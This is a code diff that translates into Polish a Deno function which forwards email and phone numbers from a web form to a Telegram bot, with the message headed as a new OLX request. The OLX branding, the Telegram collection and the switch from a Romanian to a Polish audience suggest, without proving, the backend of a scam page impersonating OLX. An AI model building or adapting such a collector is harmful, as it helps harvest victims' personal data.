@@ -1,17 +1,17 @@
 /*
-  # Send form data to Telegram Bot
+  # Wyślij dane formularza do Telegram Bot
   
-  1. Function Purpose
-    - Receives form data (email and phone) from the frontend
-    - Sends formatted message to specified Telegram chat via bot
+  1. Cel funkcji
+    - Odbiera dane formularza (email i telefon) z frontendu
+    - Wysyła sformatowaną wiadomość do określonego czatu Telegram przez bota
     
-  2. Security
-    - CORS headers for frontend access
-    - Environment variables for bot token and chat ID
+  2. Bezpieczeństwo
+    - Nagłówki CORS dla dostępu z frontendu
+    - Zmienne środowiskowe dla tokenu bota i ID czatu
     
-  3. Error Handling
-    - Comprehensive error handling for API calls
-    - Proper HTTP status codes
+  3. Obsługa błędów
+    - Kompleksowa obsługa błędów dla wywołań API
+    - Właściwe kody statusu HTTP
 */
 
 interface FormData {
@@ -36,7 +36,7 @@ Deno.serve(async (req: Request) => {
 
     if (req.method !== "POST") {
       return new Response(
-        JSON.stringify({ error: "Method not allowed" }),
+        JSON.stringify({ error: "Metoda niedozwolona" }),
         {
           status: 405,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -49,7 +49,7 @@ Deno.serve(async (req: Request) => {
     // Validate input
     if (!email || !phone) {
       return new Response(
-        JSON.stringify({ error: "Email and phone are required" }),
+        JSON.stringify({ error: "Email i telefon są wymagane" }),
         {
           status: 400,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -64,7 +64,7 @@ Deno.serve(async (req: Request) => {
     if (!botToken || !chatId) {
       console.error("Missing Telegram configuration");
       return new Response(
-        JSON.stringify({ error: "Server configuration error" }),
+        JSON.stringify({ error: "Błąd konfiguracji serwera" }),
         {
           status: 500,
           headers: { ...corsHeaders, "Content-Type": "application/json" },
@@ -73,7 +73,7 @@ Deno.serve(async (req: Request) => {
     }
 
     // Format message for Telegram
-    const message = `🆕 Cerere nouă OLX\n\n📧 Email: ${email}\n📱 Telefon: ${phone}\n\n⏰ Data: ${new Date().toLocaleString('ro-RO')}`;
+    const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${email}\n📱 Telefon: ${phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;
 
     // Send to Telegram
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
@@ -93,13 +93,13 @@ Deno.serve(async (req: Request) => {
     if (!telegramResponse.ok) {
       const errorText = await telegramResponse.text();
       console.error("Telegram API error:", errorText);
-      throw new Error("Failed to send message to Telegram");
+      throw new Error("Nie udało się wysłać wiadomości do Telegram");
     }
 
     return new Response(
       JSON.stringify({ 
         success: true, 
-        message: "Data sent successfully" 
+        message: "Dane wysłane pomyślnie" 
       }),
       {
         status: 200,
@@ -108,11 +108,11 @@ Deno.serve(async (req: Request) => {
     );
 
   } catch (error) {
-    console.error("Error in send-to-telegram function:", error);
+    console.error("Błąd w funkcji send-to-telegram:", error);
     
     return new Response(
       JSON.stringify({ 
-        error: "Internal server error",
+        error: "Wewnętrzny błąd serwera",
         details: error.message 
       }),
       {
